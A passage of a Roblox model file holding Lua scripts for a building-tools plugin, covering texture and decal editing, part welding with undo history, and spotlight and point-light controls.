					texture_id = Texture.Texture:lower();
					texture_transparency = Texture.Transparency;
					texture_repeat_x = Texture.StudsPerTileU;
					texture_repeat_y = Texture.StudsPerTileV;

				-- Set the values to `nil` if they vary across the selection
				else
					if texture_id ~= Texture.Texture:lower() then
						texture_id = nil;
					end;
					if texture_transparency ~= Texture.Transparency then
						texture_transparency = nil;
					end;
					if texture_repeat_x ~= Texture.StudsPerTileU then
						texture_repeat_x = nil;
					end;
					if texture_repeat_y ~= Texture.StudsPerTileV then
						texture_repeat_y = nil;
					end;
				end;

			end;

			-- Update the GUI's values
			if not self.State.image_id_focused then
				self.GUI.ImageIDOption.TextBox.Text = texture_id and ( texture_id:match( "%?id=([0-9]+)" ) or "" ) or "*";
			end;
			if not self.State.transparency_focused then
				self.GUI.TransparencyOption.TransparencyInput.TextBox.Text = texture_transparency and _round( texture_transparency, 2 ) or "*";
			end;
			if not self.State.rep_x_focused then
				self.GUI.RepeatOption.XInput.TextBox.Text = texture_repeat_x and _round( texture_repeat_x, 2 ) or "*";
			end;
			if not self.State.rep_y_focused then
				self.GUI.RepeatOption.YInput.TextBox.Text = texture_repeat_y and _round( texture_repeat_y, 2 ) or "*";
			end;

		elseif self.Options.mode == "decal" then

			-- Get the applicable decals
			local decals = {};
			for _, Item in pairs( Selection.Items ) do
				local decals_found = _getChildrenOfClass( Item, "Decal" );
				for _, Decal in pairs( decals_found ) do
					if Decal.Face == self.Options.side then
						table.insert( decals, Decal );
						break;
					end;
				end;
			end;

			-- If there are no decals
			if #decals == 0 then
				self.GUI.AddButton.Visible = true;
				self.GUI.RemoveButton.Visible = false;
				self.GUI.ImageIDOption.Visible = false;
				self.GUI.TransparencyOption.Visible = false;
				self.GUI.RepeatOption.Visible = false;
				self.GUI.Size = UDim2.new( 0, 200, 0, 130 );

			-- If only some parts have decals
			elseif #decals ~= #Selection.Items then
				self.GUI.AddButton.Visible = true;
				self.GUI.RemoveButton.Visible = true;
				self.GUI.ImageIDOption.Visible = true;
				self.GUI.TransparencyOption.Visible = true;
				self.GUI.RepeatOption.Visible = false;
				self.GUI.ImageIDOption.Position = UDim2.new( 0, 14, 0, 135 );
				self.GUI.TransparencyOption.Position = UDim2.new( 0, 14, 0, 170 );
				self.GUI.Size = UDim2.new( 0, 200, 0, 245 );

			-- If every item has a decal
			elseif #decals == #Selection.Items then
				self.GUI.AddButton.Visible = false;
				self.GUI.RemoveButton.Visible = true;
				self.GUI.ImageIDOption.Visible = true;
				self.GUI.TransparencyOption.Visible = true;
				self.GUI.RepeatOption.Visible = false;
				self.GUI.ImageIDOption.Position = UDim2.new( 0, 14, 0, 100 );
				self.GUI.TransparencyOption.Position = UDim2.new( 0, 14, 0, 135 );
				self.GUI.Size = UDim2.new( 0, 200, 0, 205 );
			end;

			-- Get the values to display on the GUI
			local decal_id, decal_transparency;
			for decal_index, Decal in pairs( decals ) do

				-- Set the start values for later comparison
				if decal_index == 1 then
					decal_id = Decal.Texture:lower();
					decal_transparency = Decal.Transparency;

				-- Set the values to `nil` if they vary across the selection
				else
					if decal_id ~= Decal.Texture:lower() then
						decal_id = nil;
					end;
					if decal_transparency ~= Decal.Transparency then
						decal_transparency = nil;
					end;
				end;

			end;

			-- Update the GUI's values
			if not self.State.image_id_focused then
				self.GUI.ImageIDOption.TextBox.Text = decal_id and ( decal_id:match( "%?id=([0-9]+)" ) or "" ) or "*";
			end;
			if not self.State.transparency_focused then
				self.GUI.TransparencyOption.TransparencyInput.TextBox.Text = decal_transparency and _round( decal_transparency, 2 ) or "*";
			end;

		end;
	end;

end;

Tools.Texture.showGUI = function ( self )

	-- Initialize the GUI if it's not ready yet
	if not self.GUI then
		local Container = Tool.Interfaces.BTTextureToolGUI:Clone();
		Container.Parent = UI;

		-- Add functionality to the add/remove buttons
		Container.AddButton.Button.MouseButton1Up:connect( function ()
			if self.Options.mode == "decal" then
				self:addDecal();
			elseif self.Options.mode == "texture" then
				self:addTexture();
			end;
		end );
		Container.RemoveButton.Button.MouseButton1Up:connect( function ()
			if self.Options.mode == "decal" then
				self:removeDecal();
			elseif self.Options.mode == "texture" then
				self:removeTexture();
			end;
		end );

		-- Add functionality to the mode selectors
		Container.ModeOption.Decal.Button.MouseButton1Down:connect( function ()
			self:changeMode( "decal" );
		end );
		Container.ModeOption.Texture.Button.MouseButton1Down:connect( function ()
			self:changeMode( "texture" );
		end );

		-- Add the side dropdown
		local SideDropdown = createDropdown();
		self.SideDropdown = SideDropdown;
		SideDropdown.Frame.Parent = Container.SideOption;
		SideDropdown.Frame.Position = UDim2.new( 0, 35, 0, 0 );
		SideDropdown.Frame.Size = UDim2.new( 1, -50, 0, 25 );
		SideDropdown:addOption( "TOP" ).MouseButton1Up:connect( function ()
			self:changeSide( Enum.NormalId.Top );
		end );
		SideDropdown:addOption( "BOTTOM" ).MouseButton1Up:connect( function ()
			self:changeSide( Enum.NormalId.Bottom );
		end );
		SideDropdown:addOption( "FRONT" ).MouseButton1Up:connect( function ()
			self:changeSide( Enum.NormalId.Front );
		end );
		SideDropdown:addOption( "BACK" ).MouseButton1Up:connect( function ()
			self:changeSide( Enum.NormalId.Back );
		end );
		SideDropdown:addOption( "LEFT" ).MouseButton1Up:connect( function ()
			self:changeSide( Enum.NormalId.Left );
		end );
		SideDropdown:addOption( "RIGHT" ).MouseButton1Up:connect( function ()
			self:changeSide( Enum.NormalId.Right );
		end );

		-- Add functionality to the repeat inputs
		Container.RepeatOption.XInput.TextButton.MouseButton1Down:connect( function ()
			self.State.rep_x_focused = true;
			Container.RepeatOption.XInput.TextBox:CaptureFocus();
		end );
		Container.RepeatOption.XInput.TextBox.FocusLost:connect( function ( enter_pressed )
			local potential_new = tonumber( Container.RepeatOption.XInput.TextBox.Text );
			if potential_new then
				self:changeFrequency( 'x', potential_new );
			end;
			self.State.rep_x_focused = false;
		end );

		Container.RepeatOption.YInput.TextButton.MouseButton1Down:connect( function ()
			self.State.rep_y_focused = true;
			Container.RepeatOption.YInput.TextBox:CaptureFocus();
		end );
		Container.RepeatOption.YInput.TextBox.FocusLost:connect( function ( enter_pressed )
			local potential_new = tonumber( Container.RepeatOption.YInput.TextBox.Text );
			if potential_new then
				self:changeFrequency( 'y', potential_new );
			end;
			self.State.rep_y_focused = false;
		end );

		-- Add functionality to the decal/texture ID inputs
		Container.ImageIDOption.TextButton.MouseButton1Down:connect( function ()
			self.State.image_id_focused = true;
			Container.ImageIDOption.TextBox:CaptureFocus();
		end );
		Container.ImageIDOption.TextBox.FocusLost:connect( function ( enter_pressed )
			local input = Container.ImageIDOption.TextBox.Text;
			local potential_new = tonumber( input ) or input:lower():match( "%?id=([0-9]+)" );
			if potential_new then
				if self.Options.mode == "decal" then
					self:changeDecal( potential_new );
				elseif self.Options.mode == "texture" then
					self:changeTexture( potential_new );
				end;
			end;
			self.State.image_id_focused = false;
		end );

		Container.TransparencyOption.TransparencyInput.TextButton.MouseButton1Down:connect( function ()
			self.State.transparency_focused = true;
			Container.TransparencyOption.TransparencyInput.TextBox:CaptureFocus();
		end );
		Container.TransparencyOption.TransparencyInput.TextBox.FocusLost:connect( function ( enter_pressed )
			local potential_new = tonumber( Container.TransparencyOption.TransparencyInput.TextBox.Text );
			if potential_new then
				if potential_new > 1 then
					potential_new = 1;
				elseif potential_new < 0 then
					potential_new = 0;
				end;
				self:changeTransparency( potential_new );
			end;
			self.State.transparency_focused = false;
		end );

		self.GUI = Container;
	end;

	-- Reveal the GUI
	self.GUI.Visible = true;

end;

Tools.Texture.hideGUI = function ( self )

	-- Hide the GUI if it exists already
	if self.GUI then
		self.GUI.Visible = false;
	end;

end;

Tools.Texture.Loaded = true;]]></ProtectedString>
							</Properties>
						</Item>
						<Item class="LocalScript" referent="RBX7D6F032331344729A611C8703631A03B">
							<Properties>
								<bool name="Disabled">true</bool>
								<Content name="LinkedSource"><null></null></Content>
								<string name="Name">BTWeldTool</string>
								<string name="ScriptGuid"></string>
								<ProtectedString name="Source"><![CDATA[-- Load the main tool's core environment when it's ready
repeat wait() until (
	_G.BTCoreEnv and
	_G.BTCoreEnv[script.Parent.Parent] and
	_G.BTCoreEnv[script.Parent.Parent].CoreReady
);
setfenv( 1, _G.BTCoreEnv[script.Parent.Parent] );

------------------------------------------
-- Weld tool
------------------------------------------

-- Create the tool
Tools.Weld = {};

-- Define the tool's color
Tools.Weld.Color = BrickColor.new( "Really black" );

-- Keep a container for state data
Tools.Weld.State = {};

-- Keep a container for temporary connections
Tools.Weld.Connections = {};

-- Keep a container for platform event connections
Tools.Weld.Listeners = {};

-- Start adding functionality to the tool
Tools.Weld.Listeners.Equipped = function ()

	local self = Tools.Weld;

	-- Change the color of selection boxes temporarily
	self.State.PreviousSelectionBoxColor = SelectionBoxColor;
	SelectionBoxColor = self.Color;
	updateSelectionBoxColor();

	-- Reveal the GUI
	self:showGUI();

	-- Highlight the last part in the selection
	if Selection.Last then
		SelectionBoxes[Selection.Last].Color = BrickColor.new( "Pastel Blue" );
	end;
	self.Connections.LastPartHighlighter = Selection.Changed:connect( function ()
		updateSelectionBoxColor();
		if Selection.Last then
			SelectionBoxes[Selection.Last].Color = BrickColor.new( "Pastel Blue" );
		end;
	end );

end;

Tools.Weld.Listeners.Unequipped = function ()

	local self = Tools.Weld;

	-- Hide the GUI
	self:hideGUI();

	-- Disconnect temporary connections
	for connection_index, Connection in pairs( self.Connections ) do
		Connection:disconnect();
		self.Connections[connection_index] = nil;
	end;

	-- Restore the original color of selection boxes
	SelectionBoxColor = self.State.PreviousSelectionBoxColor;
	updateSelectionBoxColor();

end;

Tools.Weld.Listeners.Button2Down = function ()

	local self = Tools.Weld;

	-- Capture the camera rotation (for later use
	-- in determining whether a surface was being
	-- selected or the camera was being rotated
	-- with the right mouse button)
	local cr_x, cr_y, cr_z = Services.Workspace.CurrentCamera.CoordinateFrame:toEulerAnglesXYZ();
	self.State.PreB2DownCameraRotation = Vector3.new( cr_x, cr_y, cr_z );

end;

Tools.Weld.Listeners.Button2Up = function ()

	local self = Tools.Weld;

	local cr_x, cr_y, cr_z = Services.Workspace.CurrentCamera.CoordinateFrame:toEulerAnglesXYZ();
	local CameraRotation = Vector3.new( cr_x, cr_y, cr_z );

	-- If a part is selected
	if Selection:find( Mouse.Target ) and self.State.PreB2DownCameraRotation == CameraRotation then
		Selection:focus( Mouse.Target );
	end;

end;

Tools.Weld.weld = function ( self )

	local HistoryRecord = {
		weld_parents = {};
		unapply = function ( self )
			Selection:clear();
			for _, Weld in pairs( self.welds ) do
				Selection:add( Weld.Part0 );
				Selection:add( Weld.Part1 );
				Weld.Parent = nil;
			end;
		end;
		apply = function ( self )
			Selection:clear();
			for _, Weld in pairs( self.welds ) do
				Weld.Parent = self.weld_parents[Weld];
				Selection:add( Weld.Part0 );
				Selection:add( Weld.Part1 );
			end;
		end;
	};

	-- Keep track of the welds we create
	local welds = {};

	-- Make sure there's more than one item
	if #Selection.Items > 1 and Selection.Last then

		-- Weld all the parts to the last part
		for _, Item in pairs( Selection.Items ) do
			if Item ~= Selection.Last then
				local Weld = RbxUtility.Create "Weld" {
					Name = 'BTWeld';
					Parent = Selection.Last;
					Part0 = Selection.Last;
					Part1 = Item;
					Archivable = false;

					-- Calculate the offset of `Item` from `Selection.Last`
					C1 = Item.CFrame:toObjectSpace( Selection.Last.CFrame );
				};
				table.insert( welds, Weld );
				HistoryRecord.weld_parents[Weld] = Weld.Parent;
			end;
		end;

	end;

	HistoryRecord.welds = welds;
	History:add( HistoryRecord );

	-- Update the change bar
	self.GUI.Changes.Text.Text = "created " .. #welds .. " weld" .. ( #welds ~= 1 and "s" or "" );

	-- Play a confirmation sound
	local Sound = RbxUtility.Create "Sound" {
		Name = "BTActionCompletionSound";
		Pitch = 1.5;
		SoundId = Assets.ActionCompletionSound;
		Volume = 1;
		Parent = Player;
	};
	Sound:Play();
	Sound:Destroy();

end;

Tools.Weld.breakWelds = function ( self )

	local HistoryRecord = {
		weld_parents = {};
		apply = function ( self )
			Selection:clear();
			for _, Weld in pairs( self.welds ) do
				Selection:add( Weld.Part0 );
				Selection:add( Weld.Part1 );
				Weld.Parent = nil;
			end;
		end;
		unapply = function ( self )
			Selection:clear();
			for _, Weld in pairs( self.welds ) do
				Selection:add( Weld.Part1 );
				Selection:add( Weld.Part0 );
				Weld.Parent = self.weld_parents[Weld];
			end;
		end;
	};

	-- Break any welds we created for each item in the selection
	local welds = {};
	local all_objects = _getAllDescendants( Game.Workspace );
	for _, Weld in pairs( all_objects ) do
		if Weld:IsA( "Weld" ) and Weld.Name == "BTWeld" then
			for _, Item in pairs( Selection.Items ) do
				if Weld.Part0 == Item or Weld.Part1 == Item then
					if not HistoryRecord.weld_parents[Weld] then
						table.insert( welds, Weld );
						HistoryRecord.weld_parents[Weld] = Weld.Parent;
						Weld.Parent = nil;
					end;
				end;
			end;
		end;
	end;

	HistoryRecord.welds = welds;
	History:add( HistoryRecord );

	-- Update the change bar
	self.GUI.Changes.Text.Text = "broke " .. #welds .. " weld" .. ( #welds ~= 1 and "s" or "" );

	-- Play a confirmation sound
	local Sound = RbxUtility.Create "Sound" {
		Name = "BTActionCompletionSound";
		Pitch = 1.5;
		SoundId = Assets.ActionCompletionSound;
		Volume = 1;
		Parent = Player;
	};
	Sound:Play();
	Sound:Destroy();

end;

Tools.Weld.showGUI = function ( self )

	-- Initialize the GUI if it's not ready yet
	if not self.GUI then

		local Container = Tool.Interfaces.BTWeldToolGUI:Clone();
		Container.Parent = UI;

		Container.Interface.WeldButton.MouseButton1Up:connect( function ()
			self:weld();
		end );

		Container.Interface.BreakWeldsButton.MouseButton1Up:connect( function ()
			self:breakWelds();
		end );

		self.GUI = Container;
	end;

	-- Reveal the GUI
	self.GUI.Visible = true;

end;

Tools.Weld.hideGUI = function ( self )

	-- Hide the GUI if it exists already
	if self.GUI then
		self.GUI.Visible = false;
	end;

end;

Tools.Weld.Loaded = true;]]></ProtectedString>
							</Properties>
						</Item>
						<Item class="LocalScript" referent="RBX16B7DA220E9C445694265EB86884D0D3">
							<Properties>
								<bool name="Disabled">true</bool>
								<Content name="LinkedSource"><null></null></Content>
								<string name="Name">BTLightingTool</string>
								<string name="ScriptGuid"></string>
								<ProtectedString name="Source"><![CDATA[-- Load the main tool's core environment when it's ready
repeat wait() until (
	_G.BTCoreEnv and
	_G.BTCoreEnv[script.Parent.Parent] and
	_G.BTCoreEnv[script.Parent.Parent].CoreReady
);
setfenv( 1, _G.BTCoreEnv[script.Parent.Parent] );

------------------------------------------
-- Lighting tool
------------------------------------------

-- Create the tool
Tools.Lighting = {};

-- Define the tool's color
Tools.Lighting.Color = BrickColor.new( "Really black" );

-- Keep a container for state data
Tools.Lighting.State = {};

-- Keep a container for temporary connections
Tools.Lighting.Connections = {};

-- Keep a container for platform event connections
Tools.Lighting.Listeners = {};

-- Start adding functionality to the tool
Tools.Lighting.Listeners.Equipped = function ()

	local self = Tools.Lighting;

	-- Change the color of selection boxes temporarily
	self.State.PreviousSelectionBoxColor = SelectionBoxColor;
	SelectionBoxColor = self.Color;
	updateSelectionBoxColor();

	-- Reveal the GUI
	self:showGUI();

	-- Update the GUI regularly
	coroutine.wrap( function ()
		updater_on = true;

		-- Provide a function to stop the loop
		self.Updater = function ()
			updater_on = false;
		end;

		while wait( 0.1 ) and updater_on do

			-- Make sure the tool's equipped
			if CurrentTool == self then

				-- Update the GUI if it's visible
				if self.GUI and self.GUI.Visible then
					self:updateGUI();
				end;

			end;

		end;

	end )();

end;

Tools.Lighting.Listeners.Unequipped = function ()

	local self = Tools.Lighting;

	-- Stop the GUI updater
	if self.Updater then
		self.Updater();
		self.Updater = nil;
	end;

	-- Hide the GUI
	self:hideGUI();

	-- Disconnect temporary connections
	for connection_index, Connection in pairs( self.Connections ) do
		Connection:disconnect();
		self.Connections[connection_index] = nil;
	end;

	-- Restore the original color of selection boxes
	SelectionBoxColor = self.State.PreviousSelectionBoxColor;
	updateSelectionBoxColor();

end;

Tools.Lighting.Listeners.Button2Down = function ()

	local self = Tools.Lighting;

	-- Capture the camera rotation (for later use
	-- in determining whether a surface was being
	-- selected or the camera was being rotated
	-- with the right mouse button)
	local cr_x, cr_y, cr_z = Services.Workspace.CurrentCamera.CoordinateFrame:toEulerAnglesXYZ();
	self.State.PreB2DownCameraRotation = Vector3.new( cr_x, cr_y, cr_z );

end;

Tools.Lighting.Listeners.Button2Up = function ()

	local self = Tools.Lighting;

	local cr_x, cr_y, cr_z = Services.Workspace.CurrentCamera.CoordinateFrame:toEulerAnglesXYZ();
	local CameraRotation = Vector3.new( cr_x, cr_y, cr_z );

	-- If a surface is selected, change the side option
	if Selection:find( Mouse.Target ) and self.State.PreB2DownCameraRotation == CameraRotation then
		self:changeSide( Mouse.TargetSurface );
	end;

end;

Tools.Lighting.updateGUI = function ( self )

	-- Make sure the GUI exists
	if not self.GUI then
		return;
	end;

	-- If there are items, display the regular interface
	if #Selection.Items > 0 then
		local spotlights = self:getSpotlights();
		local pointlights = self:getPointLights();

		-- Get the properties of the spot/point lights
		local sl_color_r, sl_color_g, sl_color_b, sl_brightness, sl_range, sl_shadows, sl_angle, sl_side;
		local pl_color_r, pl_color_g, pl_color_b, pl_brightness, pl_range, pl_shadows;
		for light_index, Light in pairs( spotlights ) do

			-- Set the initial values for later comparison
			if light_index == 1 then
				sl_color_r, sl_color_g, sl_color_b = Light.Color.r, Light.Color.g, Light.Color.b;
				sl_brightness = Light.Brightness;
				sl_range = Light.Range;
				sl_shadows = Light.Shadows;
				sl_angle = Light.Angle;
				sl_side = Light.Face;

			-- Set the values to `nil` if they vary across the selection
			else
				if sl_color_r ~= Light.Color.r then
					sl_color_r = nil;
				end;
				if sl_color_g ~= Light.Color.g then
					sl_color_g = nil;
				end;
				if sl_color_b ~= Light.Color.b then
					sl_color_b = nil;
				end;
				if sl_brightness ~= Light.Brightness then
					sl_brightness = nil;
				end;
				if sl_range ~= Light.Range then
					sl_range = nil;
				end;
				if sl_shadows ~= Light.Shadows then
					sl_shadows = nil;
				end;
				if sl_angle ~= Light.Angle then
					sl_angle = nil;
				end;
				if sl_side ~= Light.Face then
					sl_side = nil;
				end;
			end;

		end;

		for light_index, Light in pairs( pointlights ) do

			-- Set the initial values for later comparison
			if light_index == 1 then
				pl_color_r, pl_color_g, pl_color_b = Light.Color.r, Light.Color.g, Light.Color.b;
				pl_brightness = Light.Brightness;
				pl_range = Light.Range;
				pl_shadows = Light.Shadows;

			-- Set the values to `nil` if they vary across the selection
			else
				if pl_color_r ~= Light.Color.r then
					pl_color_r = nil;
				end;
				if pl_color_g ~= Light.Color.g then
					pl_color_g = nil;
				end;
				if pl_color_b ~= Light.Color.b then
					pl_color_b = nil;
				end;
				if pl_brightness ~= Light.Brightness then
					pl_brightness = nil;
				end;
				if pl_range ~= Light.Range then
					pl_range = nil;
				end;
				if pl_shadows ~= Light.Shadows then
					pl_shadows = nil;
				end;
			end;

		end;

		self.State.sl_color = ( sl_color_r and sl_color_g and sl_color_b ) and Color3.new( sl_color_r, sl_color_g, sl_color_b ) or nil;
		self.State.pl_color = ( pl_color_r and pl_color_g and pl_color_b ) and Color3.new( pl_color_r, pl_color_g, pl_color_b ) or nil;

		-- Update the spotlight GUI data
		if not self.State.sl_color_r_focused then
			self.GUI.Spotlight.Options.ColorOption.RInput.TextBox.Text = sl_color_r and _round( sl_color_r * 255, 0 ) or '*';
		end;
		if not self.State.sl_color_g_focused then
			self.GUI.Spotlight.Options.ColorOption.GInput.TextBox.Text = sl_color_g and _round( sl_color_g * 255, 0 ) or '*';
		end;
		if not self.State.sl_color_b_focused then
			self.GUI.Spotlight.Options.ColorOption.BInput.TextBox.Text = sl_color_b and _round( sl_color_b * 255, 0 ) or '*';
		end;
		if not self.State.sl_brightness_focused then
			self.GUI.Spotlight.Options.BrightnessOption.Input.TextBox.Text = sl_brightness and _round( sl_brightness, 2 ) or '*';
		end;
		if not self.State.sl_range_focused then
			self.GUI.Spotlight.Options.RangeOption.Input.TextBox.Text = sl_range and _round( sl_range, 2 ) or '*';
		end;
		if sl_shadows == nil then
			self.GUI.Spotlight.Options.ShadowsOption.On.Background.Image = Assets.LightSlantedRectangle;
			self.GUI.Spotlight.Options.ShadowsOption.On.SelectedIndicator.BackgroundTransparency = 1;
			self.GUI.Spotlight.Options.ShadowsOption.Off.Background.Image = Assets.LightSlantedRectangle;
			self.GUI.Spotlight.Options.ShadowsOption.Off.SelectedIndicator.BackgroundTransparency = 1;
		elseif sl_shadows == true then
			self.GUI.Spotlight.Options.ShadowsOption.On.Background.Image = Assets.DarkSlantedRectangle;
			self.GUI.Spotlight.Options.ShadowsOption.On.SelectedIndicator.BackgroundTransparency = 0;
			self.GUI.Spotlight.Options.ShadowsOption.Off.Background.Image = Assets.LightSlantedRectangle;
			self.GUI.Spotlight.Options.ShadowsOption.Off.SelectedIndicator.BackgroundTransparency = 1;
		elseif sl_shadows == false then
			self.GUI.Spotlight.Options.ShadowsOption.On.Background.Image = Assets.LightSlantedRectangle;
			self.GUI.Spotlight.Options.ShadowsOption.On.SelectedIndicator.BackgroundTransparency = 1;
			self.GUI.Spotlight.Options.ShadowsOption.Off.Background.Image = Assets.DarkSlantedRectangle;
			self.GUI.Spotlight.Options.ShadowsOption.Off.SelectedIndicator.BackgroundTransparency = 0;
		end;
		if not self.State.sl_angle_focused then
			self.GUI.Spotlight.Options.AngleOption.Input.TextBox.Text = sl_angle and _round( sl_angle, 2 ) or '*';
		end;
		self.SideDropdown:selectOption( sl_side and sl_side.Name:upper() or '*' );

		-- Update the point light GUI info
		if not self.State.pl_color_r_focused then
			self.GUI.PointLight.Options.ColorOption.RInput.TextBox.Text = pl_color_r and _round( pl_color_r * 255, 0 ) or '*';
		end;
		if not self.State.pl_color_g_focused then
			self.GUI.PointLight.Options.ColorOption.GInput.TextBox.Text = pl_color_g and _round( pl_color_g * 255, 0 ) or '*';
		end;
		if not self.State.pl_color_b_focused then
			self.GUI.PointLight.Options.ColorOption.BInput.TextBox.Text = pl_color_b and _round( pl_color_b * 255, 0 ) or '*';
		end;
		if not self.State.pl_brightness_focused then
			self.GUI.PointLight.Options.BrightnessOption.Input.TextBox.Text = pl_brightness and _round( pl_brightness, 2 ) or '*';
		end;
		if not self.State.pl_range_focused then
			self.GUI.PointLight.Options.RangeOption.Input.TextBox.Text = pl_range and _round( pl_range, 2 ) or '*';
		end;
		if pl_shadows == nil then
			self.GUI.PointLight.Options.ShadowsOption.On.Background.Image = Assets.LightSlantedRectangle;
			self.GUI.PointLight.Options.ShadowsOption.On.SelectedIndicator.BackgroundTransparency = 1;
			self.GUI.PointLight.Options.ShadowsOption.Off.Background.Image = Assets.LightSlantedRectangle;
			self.GUI.PointLight.Options.ShadowsOption.Off.SelectedIndicator.BackgroundTransparency = 1;
		elseif pl_shadows == true then
			self.GUI.PointLight.Options.ShadowsOption.On.Background.Image = Assets.DarkSlantedRectangle;
			self.GUI.PointLight.Options.ShadowsOption.On.SelectedIndicator.BackgroundTransparency = 0;
			self.GUI.PointLight.Options.ShadowsOption.Off.Background.Image = Assets.LightSlantedRectangle;
			self.GUI.PointLight.Options.ShadowsOption.Off.SelectedIndicator.BackgroundTransparency = 1;
		elseif pl_shadows == false then
			self.GUI.PointLight.Options.ShadowsOption.On.Background.Image = Assets.LightSlantedRectangle;
			self.GUI.PointLight.Options.ShadowsOption.On.SelectedIndicator.BackgroundTransparency = 1;
			self.GUI.PointLight.Options.ShadowsOption.Off.Background.Image = Assets.DarkSlantedRectangle;
			self.GUI.PointLight.Options.ShadowsOption.Off.SelectedIndicator.BackgroundTransparency = 0;
		end;

		if self.GUI.SelectNote.Visible then
			self:closePointLight();
			self:closeSpotlight();
		end;
		self.GUI.Spotlight.Visible = true;
		self.GUI.PointLight.Visible = true;
		self.GUI.SelectNote.Visible = false;

		if not self.State.spotlight_open and not self.State.pointlight_open then
			self.GUI:TweenSize( UDim2.new( 0, 200, 0, 95 ), Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.5, true );
		end;

		-- If there are no spotlights
		if #spotlights == 0 then
			self.GUI.Spotlight.Options.Size = UDim2.new( 1, -3, 0, 0 );
			self.GUI.Spotlight.AddButton.Visible = true;
			self.GUI.Spotlight.RemoveButton.Visible = false;
			if self.State.spotlight_open then
				self:closeSpotlight();
			end;

		-- If only some items have spotlights
		elseif #spotlights ~= #Selection.Items then
			self.GUI.Spotlight.AddButton.Visible = true;
			self.GUI.Spotlight.RemoveButton.Position = UDim2.new( 0, 90, 0, 3 );
			self.GUI.Spotlight.RemoveButton.Visible = true;

		-- If all items have spotlights
		elseif #spotlights == #Selection.Items then
			self.GUI.Spotlight.AddButton.Visible = false;
			self.GUI.Spotlight.RemoveButton.Position = UDim2.new( 0, 127, 0, 3 );
			self.GUI.Spotlight.RemoveButton.Visible = true;
			if self.GUI.Spotlight.Size == UDim2.new( 0, 200, 0, 52 ) then
				self.GUI.Spotlight.Size = UDim2.new( 0, 200, 0, 95 );
			end;
		end;

		-- If there are no point lights
		if #pointlights == 0 then
			self.GUI.PointLight.Options.Size = UDim2.new( 1, -3, 0, 0 );
			self.GUI.PointLight.AddButton.Visible = true;
			self.GUI.PointLight.RemoveButton.Visible = false;
			if self.State.pointlight_open then
				self:closePointLight();
			end;

		-- If only some items have point lights
		elseif #pointlights ~= #Selection.Items then
			self.GUI.PointLight.AddButton.Visible = true;
			self.GUI.PointLight.RemoveButton.Position = UDim2.new( 0, 90, 0, 3 );
			self.GUI.PointLight.RemoveButton.Visible = true;

		-- If all items have point lights
		elseif #pointlights == #Selection.Items then
			self.GUI.PointLight.AddButton.Visible = false;
			self.GUI.PointLight.RemoveButton.Position = UDim2.new( 0, 127, 0, 3 );
			self.GUI.PointLight.RemoveButton.Visible = true;
		end;

	-- If nothing is selected, show the select something note
	else
		self.GUI.Spotlight.Visible = false;
		self.GUI.PointLight.Visible = false;
		self.GUI.SelectNote.Visible = true;
		self.GUI.Size = UDim2.new( 0, 200, 0, 52 );
	end;

end;

Tools.Lighting.openSpotlight = function ( self )
	self.State.spotlight_open = true;
	self:closePointLight();
	self.GUI.Spotlight.Options:TweenSize( UDim2.new( 1, -3, 0, 300 ), Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.5, true );
	self.GUI.Spotlight:TweenPosition( UDim2.new( 0, 10, 0, 30 ), Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.5, true );
	self.GUI:TweenSize( UDim2.new( 0, 200, 0, 275 ), Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.5, true );
end;

Tools.Lighting.openPointLight = function ( self )
	self.State.pointlight_open = true;
	self:closeSpotlight();
	self.GUI.PointLight.Options:TweenSize( UDim2.new( 1, -3, 0, 110 ), Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.5, true );
	self.GUI.PointLight:TweenPosition( UDim2.new( 0, 10, 0, 60 ), Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.5, true );
	self.GUI:TweenSize( UDim2.new( 0, 200, 0, 200 ), Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.5, true );
end;

Tools.Lighting.closeSpotlight = function ( self )
	self.State.spotlight_open = false;
	self.GUI.Spotlight.Options:TweenSize( UDim2.new( 1, -3, 0, 0 ), Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.5, true );
	self.GUI.PointLight:TweenPosition( UDim2.new( 0, 10, 0, 60 ), Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.5, true );
	if not self.State.pointlight_open then
		self.GUI:TweenSize( UDim2.new( 0, 200, 0, 95 ), Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.5, true );
	end;
end;

Tools.Lighting.closePointLight = function ( self )
	self.State.pointlight_open = false;
	self.GUI.PointLight:TweenPosition( UDim2.new( 0, 10, 0, self.State.spotlight_open and 240 or 60 ), Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.5, true );
	self.GUI.PointLight.Options:TweenSize( UDim2.new( 1, -3, 0, 0 ), Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.5, true );
	if not self.State.spotlight_open then
		self.GUI:TweenSize( UDim2.new( 0, 200, 0, 95 ), Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.5, true );
	end;
end;

Tools.Lighting.showGUI = function ( self )

	-- Initialize the GUI if it's not ready yet
	if not self.GUI then
		local Container = Tool.Interfaces.BTLightingToolGUI:Clone();
		Container.Parent = UI;

		Container.Spotlight.ArrowButton.MouseButton1Up:connect( function ()
			if not self.State.spotlight_open and #self:getSpotlights() > 0 then
				self:openSpotlight();
			else
				self:closeSpotlight();
			end;
		end );
		Container.PointLight.ArrowButton.MouseButton1Up:connect( function ()
			if not self.State.pointlight_open and #self:getPointLights() > 0 then
				self:openPointLight();
			else
				self:closePointLight();
			end;
		end );

		Container.Spotlight.AddButton.MouseButton1Up:connect( function ()
			self:addLight( 'SpotLight' );
			self:openSpotlight();
		end );
		Container.PointLight.AddButton.MouseButton1Up:connect( function ()
			self:addLight( 'PointLight' );
			self:openPointLight();
		end );
		Container.Spotlight.RemoveButton.MouseButton1Up:connect( function ()
			self:removeLight( 'spotlight' );
			self:closeSpotlight();
		end );
		Container.PointLight.RemoveButton.MouseButton1Up:connect( function ()
			self:removeLight( 'pointlight' );
			self:closePointLight();
		end );

		-- Create the spotlight interface's side dropdown
		local SideDropdown = createDropdown();
		self.SideDropdown = SideDropdown;
		SideDropdown.Frame.Parent = Container.Spotlight.Options.SideOption;
		SideDropdown.Frame.Position = UDim2.new( 0, 35, 0, 0 );
		SideDropdown.Frame.Size = UDim2.new( 0, 90, 0, 25 );

		SideDropdown:addOption( "TOP" ).MouseButton1Up:connect( function ()
